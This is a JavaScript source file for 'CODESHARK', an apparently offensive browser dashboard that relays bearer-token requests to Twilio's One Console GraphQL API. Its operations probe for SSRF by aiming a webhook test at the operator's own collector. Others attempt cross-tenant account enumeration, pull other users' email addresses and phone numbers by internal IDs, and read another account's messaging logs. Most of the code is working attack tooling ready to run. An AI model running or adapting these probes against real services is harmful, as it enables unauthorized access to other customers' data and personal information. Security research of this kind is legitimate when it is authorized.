/* CODESHARK — control board for the Twilio One Console probe set.
 *
 * Not a script runner. A state machine with a board attached: session state
 * (token + live TTL), target state (which account/user), and per-op state
 * (IDLE/RUN/HIT/MISS/ERR) that persists across reloads. Ops are triggered,
 * not hand-typed, so a 300-second token window is spent firing probes instead
 * of composing requests.
 *
 * Reads are always available. WRITES are interlocked behind the code —
 * deliberate, not decorative: a mutation cannot be fired by a stray click.
 *
 * The Console refuses cross-origin requests, so every call is relayed through
 * the scope-limited RPC on this same host. State (session, targets, op results)
 * lives on that host, NOT in this browser, so the board and the agent driving
 * the RPC share one session. The bearer is sent to the server once and held in
 * RAM there: it is never written to disk, never returned by /state, and never
 * retained in this page. Ops refer to it only as "the armed session".
 */
(function () {
  "use strict";

  var RPC = "/rpc-0366693288cb38f4";
  var COLLECTOR = "/collect-dfff9d2c765e396e";
  var LS = "codeshark.state.v1";

  /* ── state ───────────────────────────────────────────────────────── */
  var BLADES_LS = "codeshark.blades.v1";

  /* One entry per session. `targets` here are that session's OWN identity —
   * the account it is scoped to, the user behind it, a key on it — not an "A"
   * and a "B" living side by side in one panel. */
  var S = {
    slots: [], active: "A",
    blades: {},                 /* slot -> {session, targets, ops, log} */
    unlocked: false
  };

  function blade(name) {
    name = name || S.active || "A";
    if (!S.blades[name]) {
      S.blades[name] = {
        session: { exp: 0, iat: 0, sub: "", acct: "", armed: false, status: "EMPTY" },
        targets: {}, ops: {}, log: []
      };
    }
    return S.blades[name];
  }
  function cur() { return blade(S.active); }

  /* State lives on the RPC host, not in this browser: whatever drives the board
   * (you here, or the agent over the RPC) sees the same slots. Each slot's
   * bearer is held in RAM there and is never returned — the board sends it once
   * and thereafter refers to it as that slot's armed session. */
  function applyState(d) {
    if (!d || !d.ok) return;
    if (d.active && d.active !== "PoC") S.active = d.active;
    if (d.slots) {
      d.slots = d.slots.filter(function (sv) { return sv.slot !== "PoC"; });
      S.slots = d.slots;
      d.slots.forEach(function (sv) {
        var b = blade(sv.slot);
        b.session.exp = sv.exp || 0; b.session.iat = sv.iat || 0;
        b.session.sub = sv.sub || ""; b.session.acct = sv.acct || "";
        b.session.armed = !!sv.armed;
      });
    }
    var by = d.byslot || {};
    Object.keys(by).forEach(function (n) {
      var b = blade(n);
      b.targets = by[n].targets || {};
      b.ops = by[n].ops || {};
      b.note = by[n].note || "";
    });
    if (!d.byslot) {            /* an older board: everything is the active slot */
      var b = blade(S.active);
      b.targets = d.targets || {}; b.ops = d.ops || {};
    }
    render();
  }
  function pull() {
    return fetch(RPC + "/state")
      .then(function (r) { return r.json(); })
      .then(applyState)
      .catch(function () {});
  }
  function push(patch) {
    patch = patch || {};
    patch.action = "state";
    if (!patch.slot) patch.slot = S.active;
    return fetch(RPC + "/push", {
      method: "POST", headers: { "content-type": "application/json" },
      body: JSON.stringify(patch)
    }).then(function (r) { return r.json(); }).then(applyState).catch(function () {});
  }

  /* Which blade you were on, and each blade's own field values, survive a
   * reload here. The bearer never does — that lives only in the board's RAM. */
  function lsRead() {
    try { return JSON.parse(localStorage.getItem(BLADES_LS)) || {}; }
    catch (e) { return {}; }
  }
  function lsWrite(o) {
    try { localStorage.setItem(BLADES_LS, JSON.stringify(o)); } catch (e) {}
  }
  function lsSave() {
    var o = { active: S.active, blades: {} };
    Object.keys(S.blades).forEach(function (n) {
      o.blades[n] = { targets: S.blades[n].targets, log: (S.blades[n].log || []).slice(-60) };
    });
    lsWrite(o);
  }
  function lsRestore() {
    var o = lsRead();
    if (o.active) S.active = o.active;
    Object.keys(o.blades || {}).forEach(function (n) {
      var b = blade(n);
      b.targets = o.blades[n].targets || {};
      b.log = o.blades[n].log || [];
    });
  }

  function selectBlade(name) {
    if (!name || name === S.active) return Promise.resolve();
    S.active = name;
    lsSave();
    render();
    return push({ active: name });
  }
  function stepBlade(dir) {
    var names = (S.slots.length ? S.slots : [{ slot: "A" }]).map(function (s) { return s.slot; });
    var i = names.indexOf(S.active);
    var n = names[(i + dir + names.length) % names.length];
    if (n) selectBlade(n);
  }

  function load() { return pull(); }
  function save() { tabSaveTargets(); return push({ targets: S.targets, ops: S.ops }); }

  /* ── op registry ─────────────────────────────────────────────────── */
  var OPS = [
    { id: "decode", code: "↑↑", name: "DECODE SESSION",
      desc: "Refresh session state from the board and re-derive the TTL.",
      write: false, run: opDecode },
    { id: "webhook", code: "↑↓", name: "TEST_WEBHOOK_URL → CANARY",
      desc: "Server-side fetch primitive. Points Twilio at our collector; a hit proves SSRF.",
      write: true, run: opWebhook },
    { id: "accounts", code: "←→", name: "SEARCH_ACCOUNTS",
      desc: "Cross-tenant read. Needs no second account: foreign accounts in the result are self-evident.",
      write: false, run: opAccounts },
    { id: "identity", code: "→←", name: "IdentityUserQuery (CONTROL vs INTERNAL)",
      desc: "Own userId as control, then an internal US… SID from the public bundle.",
      write: false, run: opIdentity },
    { id: "logs", code: "BA", name: "MESSAGING_LOGS_LIST (accountSid)",
      desc: "Tenant id as a direct argument. Requires account B to be unambiguous.",
      write: false, run: opLogs },
    { id: "hits", code: "SEL", name: "READ COLLECTOR HITS",
      desc: "Pull the out-of-band log. This is where a webhook callback shows up.",
      write: false, run: opHits }
  ];

  function opState(id) {
    var o = cur().ops;
    if (!o[id]) o[id] = { status: "IDLE", last: "", ts: 0 };
    return o[id];
  }


  /* The op that needs a SECOND account takes it from the next blade, because
   * that is where the second session now lives. */
  function otherAccount() {
    var names = (S.slots.length ? S.slots : []).map(function (s) { return s.slot; });
    for (var i = 0; i < names.length; i++) {
      if (names[i] === S.active) continue;
      var t = blade(names[i]).targets.account;
      if (t) return t;
    }
    return "";
  }

  /* ── plumbing ────────────────────────────────────────────────────── */
  function log(line, cls, slot) {
    var b = blade(slot || S.active);
    var t = new Date().toISOString().substr(11, 8);
    b.log.push({ t: t, line: line, cls: cls || "" });
    if (b.log.length > 400) b.log.shift();
    lsSave(); render();
  }

  function rpc(url, method, headers, body) {
    return fetch(RPC + "/call", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ url: url, method: method, headers: headers, body: body })
    }).then(function (r) { return r.json(); });
  }

  function gql(opName, query, variables) {
    if (!cur().session.armed) return Promise.resolve({ ok: false, error: "no bearer armed in blade " + S.active });
    return fetch(RPC + "/call", {
      method: "POST", headers: { "content-type": "application/json" },
      body: JSON.stringify({
        useSession: S.active,                   /* board attaches THIS blade's bearer */
        url: "https://1console.twilio.com/graphql", method: "POST",
        headers: { "content-type": "application/json", "origin": "https://1console.twilio.com" },
        body: JSON.stringify({ operationName: opName, query: query, variables: variables || {} })
      })
    }).then(function (r) { return r.json(); });
  }

  function b64urlDecode(s) {
    s = s.replace(/-/g, "+").replace(/_/g, "/");
    while (s.length % 4) s += "=";
    return decodeURIComponent(atob(s).split("").map(function (c) {
      return "%" + ("00" + c.charCodeAt(0).toString(16)).slice(-2);
    }).join(""));
  }

  /* ── ops ─────────────────────────────────────────────────────────── */
  function opDecode() {
    return pull().then(function () {
      if (!cur().session.armed) return { status: "MISS", msg: "no bearer armed in this tab" };
      var ttl = cur().session.exp - Math.floor(Date.now() / 1000);
      if (cur().session.acct && !cur().targets.account) { cur().targets.account = cur().session.acct; }
      var m = (cur().session.sub || "").match(/US[0-9a-f]{32}/);
      if (m && !cur().targets.user) { cur().targets.user = m[0]; }
      save();
      log("blade " + S.active + ": acct=" + cur().session.acct + " ttl=" + ttl + "s", ttl > 0 ? "ok" : "bad");
      return { status: ttl > 0 ? "HIT" : "MISS", msg: "ttl " + ttl + "s" };
    });
  }

  function opWebhook() {
    var nonce = "tw-" + Math.random().toString(16).slice(2, 10);
    var target = location.origin + COLLECTOR + "/" + nonce;
    log("canary → " + target, "");
    return gql("TEST_WEBHOOK_URL",
      "mutation TEST_WEBHOOK_URL($input: WebhooksTestWebhookInput!) { " +
      "  account { webhooks { testWebhook(input: $input) { __typename } } } }",
      { input: { url: target, method: "POST" } }   /* verified shape: {url, method} */
    ).then(function (r) {
      log("rpc status " + r.status + " " + String(r.body || r.error).slice(0, 200),
          r.status === 200 ? "ok" : "bad");
      return new Promise(function (res) { setTimeout(res, 3000); }).then(function () {
        return fetch(RPC + "/hits").then(function (x) { return x.json(); });
      }).then(function (h) {
        var hit = (h.hits || []).filter(function (x) { return x.path.indexOf(nonce) >= 0; });
        if (hit.length) {
          log("CALLBACK RECEIVED from " + (hit[0].headers["Cf-Connecting-Ip"] || hit[0].peer), "ok");
          return { status: "HIT", msg: "server-side fetch confirmed" };
        }
        log("no callback for " + nonce + " (op may have errored, or no SSRF)", "");
        return { status: "MISS", msg: "no callback within 3s" };
      });
    });
  }

  function opAccounts() {
    return gql("SEARCH_ACCOUNTS",
      "query SEARCH_ACCOUNTS($pageSize: Int!, $searchString: String) { " +
      "  account { searchAccounts(pageSize: $pageSize, searchString: $searchString) { __typename } } }",
      { pageSize: 50, searchString: "" }
    ).then(function (r) {
      var body = String(r.body || r.error || "");
      log("SEARCH_ACCOUNTS " + r.status + ": " + body.slice(0, 300), r.status === 200 ? "ok" : "bad");
      var sids = body.match(/AC[0-9a-f]{32}/g) || [];
      var uniq = sids.filter(function (v, i, a) { return a.indexOf(v) === i; });
      var foreign = uniq.filter(function (s) { return s !== cur().targets.account; });
      if (foreign.length) {
        log("FOREIGN ACCOUNT SIDS RETURNED: " + foreign.length, "ok");
        return { status: "HIT", msg: foreign.length + " account(s) not ours" };
      }
      return { status: r.status === 200 ? "MISS" : "ERR",
               msg: r.status === 200 ? "only our own account returned" : "status " + r.status };
    });
  }

  function opIdentity() {
    var q = "query IdentityUserQuery($userId: String!) { account { identity { " +
            "user(input: { userId: $userId }) { userId status " +
            "emailAddresses { emailAddress status } phoneNumbers { phoneNumber status } " +
            "scopes trustedMetadata createdAt updatedAt } } } }";
    var mine = cur().targets.user;
    var internal = cur().targets.payload || "";
    if (!mine) return Promise.resolve({ status: "ERR", msg: "decode the session first" });
    return gql("IdentityUserQuery", q, { userId: mine }).then(function (a) {
      log("CONTROL  (own userId) " + a.status + ": " + String(a.body).slice(0, 160),
          a.status === 200 ? "ok" : "bad");
      if (!internal) return { status: "MISS", msg: "control only; no internal SID entered" };
      return gql("IdentityUserQuery", q, { userId: internal }).then(function (b) {
        var body = String(b.body || "");
        log("PAYLOAD  (" + internal + ") " + b.status + ": " + body.slice(0, 220),
            /emailAddress|phoneNumber/.test(body) ? "ok" : "bad");
        if (/"emailAddress"|"phoneNumber"/.test(body)) {
          log("CROSS-USER PII RETURNED", "ok");
          return { status: "HIT", msg: "returned PII for a user we do not own" };
        }
        return { status: "MISS", msg: "denied for the foreign userId" };
      });
    });
  }

  function opLogs() {
    var b = otherAccount();
    if (!b) return Promise.resolve({ status: "ERR", msg: "account B not set" });
    return gql("MESSAGING_LOGS_LIST",
      "query MESSAGING_LOGS_LIST($accountSid: String!, $pageSize: Int) { " +
      "  account { messaging { logs(accountSid: $accountSid, pageSize: $pageSize) { __typename } } } }",
      { accountSid: b, pageSize: 5 }
    ).then(function (r) {
      var body = String(r.body || r.error || "");
      log("MESSAGING_LOGS_LIST(B) " + r.status + ": " + body.slice(0, 250),
          r.status === 200 ? "ok" : "bad");
      if (r.status === 200 && !/error/i.test(body)) {
        return { status: "HIT", msg: "returned data for account B" };
      }
      return { status: "MISS", msg: "denied for account B" };
    });
  }

  function opHits() {
    return fetch(RPC + "/hits").then(function (r) { return r.json(); }).then(function (h) {
      var hits = h.hits || [];
      log("collector holds " + hits.length + " hit(s)", "");
      hits.slice(-6).forEach(function (x) {
        log("  " + x.method + " " + x.path + "  ip=" +
            (x.headers["Cf-Connecting-Ip"] || x.peer) + "  body=" + x.body_len + "B", "");
      });
      return { status: hits.length ? "HIT" : "MISS", msg: hits.length + " hit(s)" };
    });
  }

  /* ── render ──────────────────────────────────────────────────────── */
  var root = null;

  /* Each blade's fields are its session's own identity. There is no "account
   * B": account B is blade B. */
  var FIELDS = [
    { k: "account", label: "ACCOUNT", ph: "AC… (filled in from this tab's bearer)" },
    { k: "user",    label: "USER",    ph: "US… (filled in from this tab's bearer)" },
    { k: "key",     label: "KEY",     ph: "SK… a key on this account" },
    { k: "payload", label: "PAYLOAD", ph: "the SID this tab's ops aim at" }
  ];

  function bladeState(name) {
    var b = blade(name);
    var ttl = b.session.exp ? b.session.exp - Math.floor(Date.now() / 1000) : 0;
    return { b: b, ttl: ttl,
             st: !b.session.armed ? "EMPTY" : (ttl > 0 ? "ARMED" : "EXPIRED") };
  }

  function faceHTML(name) {
    return '' +
      '<div class="csk-face">' +
        '<div class="csk-sess">' +
          '<span class="csk-status">EMPTY</span>' +
          '<span class="csk-sessmeta">no bearer armed in this tab</span>' +
        '</div>' +
        '<input class="csk-token" placeholder="paste this session\u2019s bearer (eyJ…) — goes to the board, not this browser" autocomplete="off" spellcheck="false">' +
        FIELDS.map(function (f) {
          return '<label class="csk-f"><span class="csk-k">' + f.label + '</span>' +
                 '<input data-f="' + f.k + '" placeholder="' + f.ph + '"></label>';
        }).join("") +
        '<div class="csk-ops"></div>' +
        '<div class="csk-console"></div>' +
      '</div>';
  }

  function railHTML() {
    var names = (S.slots.length ? S.slots : [{ slot: "A" }]).map(function (s) { return s.slot; });
    return names.map(function (n, i) {
      return '<div class="csk-blade" data-slot="' + n + '">' +
               '<div class="csk-spine" title="Alt+' + (i + 1) + '">' +
                 '<span class="csk-spine-name">' + esc(n) + '</span>' +
                 '<span class="csk-spine-st"></span>' +
               '</div>' +
               faceHTML(n) +
             '</div>';
    }).join("");
  }

  function render() {
    if (!root) return;
    var rail = root.querySelector(".csk-rail");
    if (!rail) return;
    var names = (S.slots.length ? S.slots : [{ slot: "A" }]).map(function (s) { return s.slot; });
    if (rail.getAttribute("data-names") !== names.join(",")) {
      rail.innerHTML = railHTML();
      rail.setAttribute("data-names", names.join(","));
      wireRail(rail);
    }
    names.forEach(function (n) {
      var el = rail.querySelector('.csk-blade[data-slot="' + n + '"]');
      if (!el) return;
      var s = bladeState(n);
      el.className = "csk-blade csk-" + s.st.toLowerCase() + (n === S.active ? " csk-on" : "");
      el.querySelector(".csk-spine-st").textContent =
        s.st === "ARMED" ? "T-" + s.ttl : s.st;
      var stEl = el.querySelector(".csk-status");
      stEl.textContent = s.st + (s.st === "ARMED" ? "  T-" + s.ttl + "s" : "");
      stEl.className = "csk-status csk-st-" + s.st.toLowerCase();
      el.querySelector(".csk-sessmeta").textContent = s.b.session.acct
        ? "acct " + s.b.session.acct + "   sub " + String(s.b.session.sub).slice(-34)
        : "no bearer armed in this tab";
      FIELDS.forEach(function (f) {
        var i = el.querySelector('input[data-f="' + f.k + '"]');
        if (i && document.activeElement !== i) i.value = s.b.targets[f.k] || "";
      });
      renderOpsFor(el, n);
      renderLogFor(el, n);
    });
    var lk = root.querySelector(".csk-lockbar");
    if (lk) {
      lk.textContent = S.unlocked ? "WRITE OPS UNLOCKED" : "WRITE OPS LOCKED — enter the code";
      lk.className = "csk-lockbar " + (S.unlocked ? "csk-unlocked" : "");
    }
  }

  function renderOpsFor(el, name) {
    var host = el.querySelector(".csk-ops");
    if (!host.childElementCount) {
      host.innerHTML = OPS.map(function (o) {
        return '<div class="csk-op" data-op="' + o.id + '">' +
               '<span class="csk-led"></span><span class="csk-code">' + o.code + '</span>' +
               '<span style="flex:1">' +
                 '<div class="csk-opname">' + esc(o.name) + (o.write ? '  <span style="color:#f66">[WRITE]</span>' : '') + '</div>' +
                 '<div class="csk-opdesc">' + esc(o.desc) + '</div>' +
                 '<div class="csk-opstate">IDLE</div>' +
               '</span><button data-op="' + o.id + '">RUN</button></div>';
      }).join("");
    }
    var b = blade(name);
    OPS.forEach(function (o) {
      var st = b.ops[o.id] || (b.ops[o.id] = { status: "IDLE", last: "", run: "" });
      var row = host.querySelector('.csk-op[data-op="' + o.id + '"]');
      if (!row) return;
      row.querySelector(".csk-led").className = "csk-led csk-led-" + String(st.status).toLowerCase();
      row.querySelector(".csk-opstate").textContent = st.status + (st.last ? " — " + st.last : "");
      var btn = row.querySelector("button");
      btn.textContent = st.run ? (st.status === "RUN" ? "\u2026" + st.run : st.run) : "RUN";
      btn.className = st.run ? "csk-ran" : "";
      btn.disabled = (o.write && !S.unlocked) || st.status === "RUN";
      row.classList.toggle("csk-locked", o.write && !S.unlocked);
    });
  }

  function renderLogFor(el, name) {
    var c = el.querySelector(".csk-console");
    if (!c) return;
    c.innerHTML = (blade(name).log || []).slice(-200).map(function (l) {
      return '<div class="csk-line csk-' + (l.cls || "") + '"><span class="csk-t">' +
             l.t + '</span> ' + esc(l.line) + '</div>';
    }).join("");
    c.scrollTop = c.scrollHeight;
  }

  function esc(s) {
    return String(s).replace(/[&<>"]/g, function (c) {
      return { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c];
    });
  }

  function fire(o) {
    var st = opState(o.id);
    /* Mint an id you could not have guessed and stamp it on the button. The
     * same id goes into the console line, so a changed label is proof the
     * click actually ran this op rather than just depressing a button. */
    st.run = Math.random().toString(36).slice(2, 6).toUpperCase();
    st.status = "RUN"; st.last = ""; renderOps();
    log("\u25b6 [" + st.run + "] " + o.name, "");
    var p;
    try { p = o.run(); } catch (e) { p = Promise.resolve({ status: "ERR", msg: e.message }); }
    Promise.resolve(p).then(function (res) {
      st.status = (res && res.status) || "MISS";
      st.last = (res && res.msg) || "";
      st.ts = Date.now();
      log("\u25a0 [" + st.run + "] " + o.name + " \u2192 " + st.status +
          (st.last ? " (" + st.last + ")" : ""),
          st.status === "HIT" ? "ok" : (st.status === "ERR" ? "bad" : ""));
      save(); renderOps();
    });
  }

  /* ── the code ────────────────────────────────────────────────────── */
  var SEQ = [38,38,40,40,37,39,37,39,66,65];
  var pos = 0;
  document.addEventListener("keydown", function (e) {
    if (!root) return;
    pos = (e.keyCode === SEQ[pos]) ? pos + 1 : (e.keyCode === SEQ[0] ? 1 : 0);
    if (pos === SEQ.length) {
      pos = 0; S.unlocked = !S.unlocked;
      log(S.unlocked ? "*** WRITE OPS UNLOCKED ***" : "write ops re-locked",
          S.unlocked ? "ok" : "");
      root.classList.toggle("csk-flash", true);
      setTimeout(function () { root.classList.remove("csk-flash"); }, 600);
      renderOps();
    }
  });

  /* ── window ──────────────────────────────────────────────────────── */
  var CSS = [
    /* The rail is the board. A blade is a session: the one you are on is the
       panel, the rest are spines at the edge waiting to slide forward. */
    '.csk{font:12px/1.45 "Courier New",monospace;color:#33ff66;background:#000;height:72vh;display:flex;flex-direction:column;overflow:hidden}',
    '.csk h1{font-size:15px;letter-spacing:.32em;margin:0;padding:8px 10px;border-bottom:1px solid #0a4;color:#7f9;text-shadow:0 0 6px #0f6;flex:0 0 auto}',
    '.csk .csk-lockbar{padding:4px 10px;background:#180000;color:#f66;border-bottom:1px solid #600;letter-spacing:.1em;flex:0 0 auto}',
    '.csk .csk-lockbar.csk-unlocked{background:#001800;color:#6f6;border-color:#060}',
    '.csk .csk-rail{flex:1 1 auto;min-height:0;display:grid;grid-template-rows:auto minmax(0,1fr);grid-template-columns:repeat(19,max-content) 1fr;grid-auto-flow:column;overflow:hidden}',
    '.csk .csk-blade{display:contents}',
    
    
    '.csk .csk-blade.csk-on .csk-spine{background:#042812;border-color:#0f6;color:#bfe;box-shadow:0 -6px 14px -6px #0f6}',
    '.csk .csk-spine{grid-row:1;align-self:end;display:flex;align-items:baseline;gap:8px;padding:4px 14px;margin:6px 2px 0 0;background:#010;border:1px solid #063;border-bottom:0;letter-spacing:.16em;color:#0a6;cursor:pointer;user-select:none}',
    
    '.csk .csk-blade.csk-armed .csk-spine{color:#0f6}.csk .csk-blade.csk-expired .csk-spine{color:#f44}.csk .csk-blade.csk-empty .csk-spine{color:#565}',
    '.csk .csk-spine-name{font-weight:bold;font-size:13px;color:#7f9}','.csk .csk-blade.csk-on .csk-spine-name{color:#bfe;text-shadow:0 0 8px #0f6}',
    '.csk .csk-spine-st{font-size:10px;opacity:.8;letter-spacing:.18em}',
    '.csk .csk-face{grid-row:2;grid-column:1/-1;min-height:0;min-width:0;display:none;flex-direction:column;padding:8px 10px 10px;overflow-y:auto;border-top:1px solid #0a4;scrollbar-width:thin;scrollbar-color:#0a4 #000}',
    '.csk .csk-face::-webkit-scrollbar{width:7px}.csk .csk-face::-webkit-scrollbar-track{background:#000}.csk .csk-face::-webkit-scrollbar-thumb{background:#0a4;box-shadow:0 0 5px #0f6 inset}',
    '.csk .csk-blade.csk-on .csk-face{display:flex}',
    '.csk .csk-sess{display:flex;align-items:center;gap:10px;flex-wrap:wrap}',
    '.csk .csk-status{display:inline-block;padding:1px 8px;border:1px solid;font-weight:bold;letter-spacing:.12em}',
    '.csk .csk-st-empty{color:#666;border-color:#444}.csk .csk-st-armed{color:#0f6;border-color:#0f6}.csk .csk-st-expired{color:#f44;border-color:#f44}',
    '.csk .csk-sessmeta{color:#087;font-size:11px}',
    '.csk .csk-f{display:block;margin:2px 0}',
    '.csk .csk-k{color:#0a6;display:inline-block;min-width:78px}',
    '.csk input{background:#010;border:1px solid #0a4;color:#3f6;font:11px "Courier New",monospace;padding:3px 5px;width:100%;margin:2px 0 6px}',
    '.csk input:focus{outline:none;border-color:#3f9;box-shadow:0 0 6px #0f6}',
    '.csk .csk-op{display:flex;align-items:flex-start;gap:8px;padding:6px 0;border-bottom:1px dotted #052}',
    '.csk .csk-op.csk-locked{opacity:.42}',
    '.csk .csk-code{color:#ff0;min-width:34px;font-weight:bold}',
    '.csk .csk-led{width:9px;height:9px;border-radius:50%;margin-top:4px;flex:0 0 9px;background:#333}',
    '.csk .csk-led-run{background:#ff0;animation:hkb .5s infinite alternate}@keyframes hkb{to{opacity:.25}}',
    '.csk .csk-led-hit{background:#0f6;box-shadow:0 0 8px #0f6}.csk .csk-led-miss{background:#046}.csk .csk-led-err{background:#f33;box-shadow:0 0 8px #f33}',
    '.csk .csk-opname{color:#9fb;font-weight:bold}.csk .csk-opdesc{color:#087;font-size:11px}',
    '.csk .csk-opstate{color:#5c9;font-size:11px}',
    '.csk button{background:#020;border:1px solid #0a4;color:#3f6;font:11px "Courier New",monospace;padding:3px 10px;cursor:pointer;letter-spacing:.1em}',
    '.csk button:hover:not(:disabled){background:#053;box-shadow:0 0 6px #0f6}',
    '.csk button:disabled{opacity:.35;cursor:not-allowed}.csk button.csk-ran{color:#ff0;border-color:#880;letter-spacing:.18em}',
    '.csk .csk-console{background:#000;border:1px solid #063;flex:1 1 120px;min-height:110px;overflow-y:auto;padding:5px;font-size:11px;margin-top:8px;scrollbar-width:thin;scrollbar-color:#063 #000}',
    '.csk .csk-console::-webkit-scrollbar{width:7px}.csk .csk-console::-webkit-scrollbar-thumb{background:#063}',
    '.csk .csk-line{white-space:pre-wrap;word-break:break-all}.csk .csk-t{color:#055}',
    '.csk .csk-ok{color:#6f9}.csk .csk-bad{color:#f66}',
    '.csk.csk-flash{animation:hkf .6s steps(2) 3}@keyframes hkf{50%{background:#022}}'
  ].join("");

  function ensureCSS() {
    if (document.getElementById("csk-css")) return;
    var s = document.createElement("style");
    s.id = "csk-css"; s.textContent = CSS;
    document.head.appendChild(s);
  }

  var CS_ICON =
    '<svg width="16" height="16" viewBox="0 0 16 16" shape-rendering="crispEdges" aria-hidden="true">' +
    '<rect width="16" height="16" fill="#000"/><rect x="1" y="1" width="14" height="14" fill="none" stroke="#0f6"/>' +
    '<rect x="3" y="4" width="2" height="2" fill="#0f6"/><rect x="5" y="6" width="2" height="2" fill="#0f6"/>' +
    '<rect x="3" y="8" width="2" height="2" fill="#0f6"/><rect x="8" y="9" width="5" height="2" fill="#0f6"/></svg>';

  function bodyHTML() {
    return '' +
      '<div class="csk" tabindex="0">' +
        '<h1>C O D E S H A R K</h1>' +
        '<div class="csk-lockbar">WRITE OPS LOCKED — enter the code</div>' +
        '<div class="csk-rail"></div>' +
      '</div>';
  }

  function openCodeshark() {
    ensureCSS();
    if (typeof closeStartMenu === "function") { try { closeStartMenu(); } catch (e) {} }
    var body = window.__openDesktopWindow({
      id: "codeshark", title: "CODESHARK", icon: "&#9635;",
      tbIconSVG: CS_ICON, width: 560, bodyHTML: bodyHTML(),
      onOpen: function (el) { root = el; wire(); }
    });
    if (!root) { root = body; wire(); }
  }

  function wireRail(rail) {
    rail.addEventListener("click", function (e) {
      var bl = e.target.closest(".csk-blade");
      if (!bl) return;
      var name = bl.getAttribute("data-slot");
      if (name !== S.active) { selectBlade(name); return; }   /* click = slide */
      var btn = e.target.closest("button[data-op]");
      if (!btn) return;
      var o = OPS.filter(function (x) { return x.id === btn.getAttribute("data-op"); })[0];
      if (o) fire(o);
    });
    rail.addEventListener("change", function (e) {
      var bl = e.target.closest(".csk-blade");
      if (!bl) return;
      var name = bl.getAttribute("data-slot");
      if (e.target.classList.contains("csk-token")) {
        var v = e.target.value.trim();
        if (!v) return;
        e.target.value = "";                /* not retained in the DOM either */
        push({ token: v, slot: name }).then(function () {
          log("bearer armed in blade " + name + " (not stored in this browser)", "ok", name);
          if (name === S.active) fire(OPS[0]);
        });
        return;
      }
      var f = e.target.getAttribute("data-f");
      if (f) {
        var t = blade(name).targets;
        t[f] = e.target.value.trim();
        lsSave();
        push({ slot: name, targets: t });
      }
    });
  }

  function wire() {
    lsRestore();
    load();
    root.addEventListener("keydown", function (e) {
      if (e.ctrlKey || e.metaKey) return;
      if (e.altKey) {
        var n = parseInt(e.key, 10);
        var names = (S.slots.length ? S.slots : [{ slot: "A" }]).map(function (s) { return s.slot; });
        if (n >= 1 && n <= 9 && names[n - 1]) { e.preventDefault(); selectBlade(names[n - 1]); }
        return;
      }
      if (document.activeElement && document.activeElement.tagName === "INPUT") return;
      if (e.key === "ArrowRight") { e.preventDefault(); stepBlade(1); }
      if (e.key === "ArrowLeft")  { e.preventDefault(); stepBlade(-1); }
    });
    render();
    /* No polling. The server pushes state changes over SSE, so an op fired from
       the CLI shows up on its blade the moment it lands. Each TTL is derived
       from the exp already held for that blade. */
    if (!S._es && window.EventSource) {
      S._es = new EventSource(RPC + "/events");
      S._es.onmessage = function (e) {
        try { applyState(JSON.parse(e.data)); } catch (err) {}
      };
    }
    window.addEventListener("focus", pull);
    setInterval(render, 1000);            /* the TTL on each spine counts down */
    log("board online. rpc " + RPC + "  collector " + COLLECTOR, "");
    log("\u2190 \u2192 or Alt+1..9 switch blades. reads are live; writes need the code.", "");
  }

  window.openCodeshark = openCodeshark;
  /* Register with the window manager so a saved-open board is reopened at the
     right point in the layout restore rather than on a timer. */
  if (typeof window.__registerApp === "function") {
    window.__registerApp("codeshark", openCodeshark);
  }
  /* Layout persistence lives inline in fun.js (localStorage key
     funstuff.winstate.v1), which reopens every app through its own Start-menu
     entry. No separate registration here: two opener paths for one window is
     how the stacking order got inconsistent. */

  document.addEventListener("DOMContentLoaded", function () {
    var b = document.getElementById("sm-codeshark");
    if (b) b.addEventListener("click", openCodeshark);
  });
})();
